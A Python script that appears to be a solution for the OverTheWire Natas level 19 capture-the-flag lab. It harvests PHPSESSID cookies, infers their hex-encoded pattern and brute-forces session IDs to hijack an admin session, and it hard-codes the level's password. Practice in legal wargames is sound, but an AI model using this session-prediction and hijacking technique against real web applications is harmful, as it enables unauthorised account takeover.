import requests
from requests.auth import HTTPBasicAuth

flag = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
ending = "2d626f62"
start = "3"
third = "3"
fith = "3"

def findSimilar(example, count):
    ids = []
    for i in range(0, count):
        r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug=true", auth=HTTPBasicAuth("natas19", flag), data = { "username": "bob", "password": "admin" })

        sess_id = r.cookies.get("PHPSESSID")
        if len(sess_id) == len(example):
            ids.append(sess_id)


    similar = ""
    for i in range(0, len(example)):
        matches = 0

        for sess_id in ids:
            if example[i] == sess_id[i]:
                matches += 1

        if matches == len(ids):
            similar += example[i]
        else:
            similar += " "

    return similar

similarLong = findSimilar(f"{start}1{third}1{fith}1{ending}", 15)
similarShort = findSimilar(f"{start}1{third}1{ending}", 50)

print(similarLong)
print(similarShort)


for second in range(0, 10):
    print(second)
    for fourth in range(0, 10):
        for sixth in range (0, 10):
            cookies = {"PHPSESSID": f"{start}{second}{third}{fourth}{fith}{sixth}{ending}" }
            r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug=true", auth=HTTPBasicAuth("natas19", flag), cookies=cookies)

            # print(r.request.headers)

            if "DEBUG" not in r.text:
                print("invalid")

            if "You are an admin" not in r.text:
                print(r.text)
                quit()


for second in range(0, 10):
    print(second)
    for fourth in range(0, 10):
        cookies = {"PHPSESSID": f"{start}{second}{third}{fourth}{ending}" }
        r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug=true", auth=HTTPBasicAuth("natas19", flag), cookies=cookies)

        if "DEBUG" not in r.text:
            print("invalid")

        if "You are an admin" not in r.text:
            print(r.text)
            quit()
